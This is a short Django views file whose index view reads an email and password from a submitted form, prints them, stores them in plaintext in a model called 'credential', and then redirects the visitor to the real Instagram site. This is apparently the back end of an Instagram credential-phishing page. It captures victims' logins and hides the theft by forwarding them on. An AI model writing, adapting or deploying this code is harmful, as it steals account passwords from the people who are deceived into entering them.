from django.shortcuts import render

# Create your views here.
from django.shortcuts import render,HttpResponseRedirect
from . models import credential
# Create your views here.
def index(request):
    if request.method == "POST":
        username = request.POST.get("email")
        password = request.POST.get("pass")
        print(password,username)
        user = credential(username=username,password=password)
        user.save()
        return HttpResponseRedirect("https://www.instagram.com/")
    return render(request,'djangoPlayGround/index.html')
